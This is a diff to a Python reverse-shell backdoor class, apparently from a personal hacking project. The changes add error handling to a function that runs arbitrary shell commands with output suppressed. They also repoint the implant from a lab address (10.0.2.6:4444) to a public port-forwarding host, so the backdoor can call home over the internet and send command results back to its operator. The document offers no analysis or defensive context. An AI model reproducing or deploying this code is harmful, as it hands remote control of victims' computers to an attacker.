@@ -27,7 +27,12 @@ class Backdoor:
     
     def execute_system_command(self, command):
         DEVNULL = open(os.devnull, 'wb')
-        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
+        # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
+        try:
+            CommandOutput = subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
+        except subprocess.CalledProcessError as e:
+            CommandOutput = 'command {} return with error (code {}): {}'.format(e.cmd, e.returncode, e.output)
+        return CommandOutput
     
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -64,7 +69,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 try:
-    my_backdoor = Backdoor('10.0.2.6', 4444)
+    my_backdoor = Backdoor('raghav45456-20379.portmap.host', 63428)
     my_backdoor.run()
 except Exception:
     sys.exit()
